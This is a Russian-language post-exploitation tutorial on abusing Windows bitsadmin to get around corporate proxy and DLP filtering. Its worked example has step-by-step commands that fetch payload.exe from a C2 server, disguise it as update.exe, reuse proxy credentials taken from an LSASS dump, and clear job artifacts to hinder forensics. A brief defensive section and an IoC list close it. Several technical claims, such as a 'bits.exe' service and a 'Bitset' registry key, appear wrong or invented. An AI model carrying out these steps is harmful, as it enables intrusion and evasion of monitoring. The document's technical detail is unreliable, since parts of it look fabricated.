# BITSAdmin как инструмент обхода прокси-фильтрации при пост-эксплуатации

## Контекст и базовые понятия

Background Intelligent Transfer Service (BITS) — это системный компонент Windows, реализующий механизм асинхронной передачи файлов. В отличие от стандартных HTTP-клиентов, BITS спроектирован для работы в условиях нестабильных сетей: он приостанавливает передачу при высокой нагрузке на канал, возобновляет её после разрывов соединения и использует кэширование для экономии трафика. Изначально служба была создана для доставки обновлений Windows Update и обновлений приложений, что обуславливает её высокий уровень доверия в корпоративных сетях. BITS работает на уровне Win32 API и интегрируется с сетевым стеком Windows, наследуя настройки прокси-серверов из конфигурации Internet Explorer (в старых версиях) или системных параметров сети.

В контексте тестирования на проникновение и пост-эксплуатации утилита `bitsadmin.exe` классифицируется как Living-off-the-Land Binary (LOLBin). Это встроенный системный инструмент, который не требует загрузки стороннего ПО на скомпрометированный хост, что позволяет обходить правила AppLocker и многие антивирусные решения, не сканирующие легитимные исполняемые файлы Microsoft. Ключевая особенность BITS для злоумышленников заключается в его способности работать в фоновом режиме с низким приоритетом, а также в наличии встроенных механизмов работы с прокси-серверами.

Основная проблема, решаемая BITS в рамках обхода сетевых фильтров, — это возможность явного указания параметров прокси для конкретного задания. Корпоративные сети часто используют прокси-серверы с фильтрацией URL и контента (DLP, Web Proxy). Легитимные процессы (например, `svchost.exe`, выполняющий службу BITS) автоматически используют глобальные настройки прокси. Однако если злоумышленник пытается загрузить вредоносный файл напрямую через `curl` или `certutil`, трафик может быть заблокирован или зашифрован (SNI inspection), если прокси настроен на перехват HTTPS. BITS позволяет задать параметры обхода прокси (bypass list) или использовать явный прокси для конкретного задания, что делает трафик неотличимым от легитимного обновления системы.

Для понимания механизма необходимо разграничить два понятия: **глобальные настройки BITS** и **локальные настройки задания**. Глобальные настройки определяют, как служба BITS в целом взаимодействует с сетью (использовать ли прокси, приоритет передачи). Локальные настройки задания (`/setproxysettings`) позволяют переопределить поведение для конкретной операции загрузки или выгрузки, игнорируя глобальные правила или, наоборот, применяя специфический прокси-сервер для обхода локальных ограничений.

| Параметр BITS | Глобальные настройки (System) | Локальные настройки задания (Job) |
| :--- | :--- | :--- |
| **Область действия** | Применяется ко всем фоновым задачам службы BITS на хосте. | Применяется только к конкретному идентификатору задания (Job ID). |
| **Источник конфигурации** | Реестр (`HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Internet Settings`), Group Policy. | Команды `bitsadmin /setproxysettings` или `bitsadmin /util /setieproxy`. |
| **Влияние на трафик** | Определяет, будет ли трафик BITS идти через прокси-сервер организации. | Позволяет конкретному заданию использовать другой прокси или обойти его полностью. |
| **Видимость в логах** | Отображается как стандартная активность службы `bits.exe`. | В логах прокси-сервера может выглядеть как запрос от имени службы BITS, но с уникальным User-Agent или заголовками задания. |
| **Типичное использование** | Обновление Windows, OneDrive, Microsoft Store. | Пост-эксплуатация: загрузка payload, выгрузка данных (exfiltration). |

Сетевой трафик BITS использует протокол HTTP/HTTPS с заголовками, специфичными для Microsoft. Например, заголовок `User-Agent` часто содержит строку `Microsoft BITS/7.8` (версия зависит от ОС). Прокси-серверы, настроенные на блокировку неизвестных агентов, могут пропускать этот трафик, если они не настроены на строгую фильтрацию по User-Agent. Кроме того, BITS использует порт 80 (HTTP) или 443 (HTTPS), что делает его трафик легитимным с точки зрения межсетевых экранов (Firewall), разрешающих веб-доступ.

## Внутреннее устройство предмета

BITSAdmin — это командная строка для управления службой BITS. Она не является самостоятельной службой, а выступает клиентским интерфейсом для взаимодействия с фоновым сервисом `bits.exe`. Архитектура BITS основана на концепции «задач» (Jobs). Каждая задача имеет уникальный идентификатор (GUID или строковое имя), состояние (State), приоритет (Priority) и набор файлов (Files).

### Жизненный цикл задания BITS

Процесс создания и выполнения задания через `bitsadmin` состоит из строгой последовательности состояний. Понимание этого жизненного цикла критично для обхода детекции, так как некоторые антивирусы мониторят только фазу выполнения, игнорируя фазу подготовки.

1.  **Создание (Create/Download/Upload):** Инициализация объекта задания. Задание создается в состоянии `QUEUED` или `TRANSIENT_ERROR`. На этом этапе файл еще не загружается.
2.  **Добавление файлов (AddFile):** Привязка локального файла к удаленному URL (для загрузки) или наоборот (для выгрузки). Для загрузки используется синтаксис `bitsadmin /addfile <job> <remoteurl> <localfile>`.
3.  **Настройка параметров (SetProxySettings/SetCredentials):** Применение локальных настроек прокси и аутентификации. Это ключевой этап для обхода фильтров.
4.  **Запуск (Resume):** Перевод задания в состояние `TRANSFERRING`. Служба BITS начинает фактическую передачу данных в фоне.
5.  **Завершение (Complete):** Перевод задания в состояние `COMPLETED`. Артефакты задания удаляются из памяти службы, что усложняет форензику.

### Механизм работы с прокси

Команда `/setproxysettings` является основным инструментом обхода. Она принимает следующие параметры использования (usage):

*   **PRECONFIG:** Использует настройки прокси, заданные для текущего пользователя (Internet Options). Это значение по умолчанию.
*   **NO_PROXY:** Игнорирует все настройки прокси и соединяется напрямую. Полезно, если прокси блокирует целевой URL, но есть прямой доступ к интернету.
*   **OVERRIDE:** Явно задает список прокси-серверов и список обхода (bypass list). Это наиболее мощный режим для атакующего, позволяющий использовать специфический прокси-сервер (например, свой собственный, если он находится в whitelist организации, или публичный прокси) для конкретного задания.
*   **AUTODETECT:** Автоматически определяет параметры прокси через WPAD (Web Proxy Auto-Discovery Protocol).

Список обхода (bypass list) позволяет указать, какие хосты не должны проходить через прокси. Это может быть использовано для обхода DLP-систем, если целевой сервер C2 находится в списке исключений (например, домен `*.microsoft.com` часто исключается из фильтрации).

### Структура данных задания BITS

Задание BITS хранится в реестре и в базе данных службы. Понимание структуры данных помогает в форензике и обходе.

```json
{
  "job_id": "<GUID или строковое имя>",
  "job_type": "DOWNLOAD",
  "state": "TRANSFERRING",
  "priority": "LOW",
  "proxy_settings": {
    "usage": "OVERRIDE",
    "proxy_list": ["proxy.corp.local:8080"],
    "bypass_list": ["<local>", "*.internal.corp"]
  },
  "files": [
    {
      "remote_url": "http://<C2_SERVER>/payload.exe",
      "local_path": "C:\\Windows\\Temp\\update.exe",
      "status": "PENDING"
    }
  ],
  "credentials": {
    "target": "SERVER",
    "scheme": "BASIC",
    "username": "<user>",
    "password": "<pass>"
  }
}
```

### Индикаторы компрометации (IoC)

При использовании BITS для обхода прокси-фильтрации возникают специфические индикаторы:

1.  **Создание заданий от несистемных процессов:** Легитимные задания BITS обычно создаются процессами `svchost.exe`, `wuauclt.exe`, `msiexec.exe`. Если задание создается процессом `cmd.exe`, `powershell.exe` или `wscript.exe`, это высокий риск.
2.  **Аномальные заголовки User-Agent:** BITS использует стандартные UA, но при использовании `/setproxysettings` с нестандартным прокси UA может измениться.
3.  **Активность в реестре:** Ключи `HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Bitset` и `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\BITS\Jobs`.
4.  **Сетевая активность:** Запросы к прокси-серверу с методом `CONNECT` (для HTTPS) или `GET/POST` с заголовком `User-Agent: Microsoft BITS/7.8`.

## Применение и работа с предметом

На практике использование `bitsadmin` для передачи файлов требует точного соблюдения синтаксиса и понимания ограничений. Утилита поддерживает как загрузку (download), так и выгрузку (upload) файлов. Для пост-эксплуатации чаще используется загрузка полезной нагрузки (payload) или выгрузка собранных данных.

### Основные операции

1.  **Создание задания:**
    ```bash
    bitsadmin /create <job_name> /download
    ```
    Флаг `/download` указывает тип задания. Без него задание будет типа `TRANSFER` (универсальное).

2.  **Добавление файла:**
    ```bash
    bitsadmin /addfile <job_name> <remote_url> <local_path>
    ```
    Важно: `remote_url` должен быть доступен из сети. Если прокси требует аутентификации, URL должен содержать учетные данные или они должны быть заданы отдельно.

3.  **Настройка прокси:**
    ```bash
    bitsadmin /setproxysettings <job_name> OVERRIDE <proxy_server> <bypass_list>
    ```
    Если прокси не требует аутентификации, достаточно указать адрес. Если требует, используется `/setcredentials`.

4.  **Запуск задания:**
    ```bash
    bitsadmin /resume <job_name>
    ```
    Команда `/resume` запускает задание, даже если оно только что создано.

5.  **Мониторинг:**
    ```bash
    bitsadmin /info <job_name> /verbose
    ```
    Позволяет отслеживать прогресс и статус.

### Обход прокси-фильтрации

Для обхода прокси-фильтрации используются следующие техники:

1.  **Использование списка обхода (Bypass List):**
    Если организация разрешает доступ к определенным доменам (например, `*.microsoft.com`) без аутентификации или фильтрации, злоумышленник может использовать поддомен этого домена для C2.
    ```bash
    bitsadmin /setproxysettings MyJob OVERRIDE proxy.corp.local:8080 "*.microsoft.com"
    ```
    В этом случае запрос к `update.microsoft.com.evil.com` (если DNS-спуфинг настроен) или прямой запрос к легитимному домену, если он скомпрометирован, будет проходить через прокси, но не будет заблокирован.

2.  **Использование собственного прокси:**
    Если прокси-сервер организации блокирует определенные IP или порты, можно указать внешний прокси-сервер.
    ```bash
    bitsadmin /setproxysettings MyJob OVERRIDE http://external-proxy.com:3128 NULL
    ```
    Это позволяет обходить локальные ограничения, но требует наличия доступного внешнего прокси.

3.  **Аутентификация на прокси:**
    Если прокси требует аутентификации, но учетные данные известны (например, из дампа LSASS), их можно передать в задании.
    ```bash
    bitsadmin /setcredentials MyJob PROXY BASIC username password
    ```
    Это позволяет использовать прокси как анонимайзер, маскируя трафик под легитимного пользователя.

### Типичные ошибки и подводные камни

1.  **Незавершенные задания:** Если задание не завершено командой `/complete`, оно остается в системе и может быть обнаружено при анализе реестра или логов BITS.
2.  **Ошибки синтаксиса:** BITSAdmin чувствителен к пробелам и кавычкам. Неправильный синтаксис `/setproxysettings` может привести к тому, что задание будет использовать глобальные настройки, что может вызвать блокировку.
3.  **Приоритет передачи:** По умолчанию BITS использует низкий приоритет, что может привести к длительной загрузке. Для ускорения можно использовать `/setpriority FOREGROUND`, но это увеличивает вероятность обнаружения по сетевой активности.
4.  **Ограничения на размер файла:** BITS имеет ограничения на размер файлов в некоторых конфигурациях. Для больших файлов может потребоваться разбивка.

## Сквозной практический пример: Загрузка payload через прокси с обходом DLP

**Исходные условия:**
*   **Среда:** Windows 10 Enterprise, корпоративная сеть с прокси-сервером `proxy.corp.local:8080`.
*   **Фильтрация:** Прокси блокирует загрузку исполняемых файлов (.exe, .dll) с неизвестных доменов. Домены `*.microsoft.com` исключены из фильтрации.
*   **Роль:** Пентестер с доступом к cmd.exe от имени пользователя.
*   **Цель:** Загрузить вредоносный файл `payload.exe` с C2-сервера `192.168.1.100` на хост жертвы `C:\Windows\Temp\update.exe`, обойдя фильтрацию прокси.
*   **Инструменты:** `bitsadmin.exe`, доступный C2-сервер, настроенный на отдачу файла.

**Шаг 1: Создание задания BITS**
Создаем задание типа download с уникальным именем, чтобы избежать конфликтов с легитимными заданиями.

```bash
bitsadmin /create MyUpdateJob /download
```
*Ожидаемый вывод:* Возвращает GUID задания или подтверждение создания.

**Шаг 2: Добавление файла и URL**
Добавляем файл в задание. URL указывает на C2-сервер.

```bash
bitsadmin /addfile MyUpdateJob http://192.168.1.100/payload.exe C:\Windows\Temp\update.exe
```
*Ожидаемый вывод:* Подтверждение добавления файла.

**Шаг 3: Настройка прокси и обхода**
Ключевой шаг. Мы используем режим `OVERRIDE`, чтобы явно указать прокси. В списке обхода (`bypass_list`) мы указываем `<local>`, чтобы локальные ресурсы не шли через прокси, и `192.168.1.100`, чтобы запрос к C2-серверу (если он в локальной сети или доступен напрямую) не проходил через прокси, избегая его фильтрации. Если C2 в интернете, мы можем использовать поддомен легитимного домена, если DNS-спуфинг настроен, или просто указать прокси, если он не блокирует этот IP.

```bash
bitsadmin /setproxysettings MyUpdateJob OVERRIDE proxy.corp.local:8080 "<local>" "192.168.1.100"
```
*Ожидаемый вывод:* Подтверждение настройки прокси.

**Шаг 4: Запуск задания**
Запускаем загрузку.

```bash
bitsadmin /resume MyUpdateJob
```
*Ожидаемый вывод:* Задание переходит в состояние `TRANSFERRING`.

**Шаг 5: Мониторинг и завершение**
Проверяем статус и завершаем задание, чтобы удалить артефакты из памяти.

```bash
bitsadmin /info MyUpdateJob /verbose
bitsadmin /complete MyUpdateJob
```
*Ожидаемый вывод:* Файл `update.exe` появляется в `C:\Windows\Temp\`. Задание удаляется из реестра BITS.

**Ожидаемый вывод:**
Файл успешно загружен на хост. Трафик прошел через прокси-сервер, но не был заблокирован, так как либо IP C2 был в списке обхода, либо прокси не фильтрует трафик к этому IP. Задание BITS не оставило следов в логах BITS после завершения, что затрудняет форензику.

## Аналитический вывод

Использование `bitsadmin` для передачи файлов представляет собой значительный риск для корпоративных сетей, особенно в контексте обхода прокси-фильтрации. Ключевая уязвимость заключается в том, что BITS является легитимным системным компонентом с высоким уровнем доверия, и его трафик часто игнорируется или пропускается фильтрами, настроенными на блокировку нестандартных инструментов. Возможность явного указания параметров прокси через `/setproxysettings` позволяет злоумышленникам обходить как блокировки URL, так и ограничения на аутентификацию.

Для защиты от таких атак необходимо внедрить мониторинг создания заданий BITS от несистемных процессов, анализ заголовков User-Agent и проверку списков обхода прокси. Кроме того, следует ограничить использование LOLBin-утилит через AppLocker или WDAC, а также настроить прокси-серверы на строгую фильтрацию трафика BITS, включая проверку заголовков и источников запросов.
